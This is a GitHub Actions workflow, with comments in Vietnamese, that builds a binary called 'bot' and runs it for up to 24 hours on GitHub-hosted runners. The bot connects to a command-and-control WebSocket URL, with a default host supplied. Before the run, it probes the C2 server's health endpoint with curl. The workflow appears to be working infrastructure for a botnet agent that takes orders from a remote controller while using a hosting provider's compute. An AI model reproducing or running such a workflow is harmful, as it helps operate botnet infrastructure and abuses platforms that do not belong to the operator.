name: Run Bot (Manual)

# Chạy bot trên GitHub-hosted runner — KHÔNG cần Release.
# Actions → Run Bot (Manual) → nhập C2 URL + số phút.
on:
  workflow_dispatch:
    inputs:
      c2_url:
        description: 'C2 WebSocket URL'
        required: true
        default: 'wss://bot.minhvuong.io.vn/ws/bot/'
      duration:
        description: 'Thời gian chạy (phút, max 1440)'
        required: true
        default: '1440'

jobs:
  run-bot:
    runs-on: ubuntu-latest
    timeout-minutes: 1440
    steps:
      - uses: actions/checkout@v4

      - name: Install deps
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential libssl-dev zlib1g-dev

      - name: Build bot
        run: |
          make -C src clean || true
          make -C src dynamic
          chmod +x src/bot
          ls -la src/bot

      - name: Connectivity check to C2
        run: |
          C2_URL="${{ github.event.inputs.c2_url }}"
          # Extract host for curl probe
          HOST=$(echo "$C2_URL" | sed -E 's#^wss?://([^/:]+).*#\1#')
          echo "C2 host: $HOST"
          curl -skI --max-time 15 "https://${HOST}/health" || true
          curl -sk --max-time 15 "https://${HOST}/health" || true

      - name: Run bot (foreground)
        env:
          BOT_FOREGROUND: "1"
          C2_URL: ${{ github.event.inputs.c2_url }}
          DURATION: ${{ github.event.inputs.duration }}
        run: |
          set -e
          echo "[*] C2: $C2_URL"
          echo "[*] Duration: ${DURATION} min"
          echo "[*] CPUs: $(nproc) | RAM: $(free -h | awk '/Mem:/{print $2}')"

          # Foreground mode: no double-fork, logs visible in Actions
          ./src/bot --foreground "$C2_URL" &
          BOT_PID=$!
          echo "[*] PID=$BOT_PID"
          sleep 5
          if ! kill -0 $BOT_PID 2>/dev/null; then
            echo "[!] Bot exited early — check C2 URL / TLS / firewall"
            exit 1
          fi
          echo "[+] Bot still running after 5s"

          # Keep job alive
          SECS=$((DURATION * 60))
          END=$((SECONDS + SECS))
          while [ $SECONDS -lt $END ]; do
            if ! kill -0 $BOT_PID 2>/dev/null; then
              echo "[!] Bot died at t=${SECONDS}s"
              exit 1
            fi
            sleep 30
          done

          echo "[*] Stopping..."
          kill $BOT_PID 2>/dev/null || true
          wait $BOT_PID 2>/dev/null || true
          echo "[+] Done"
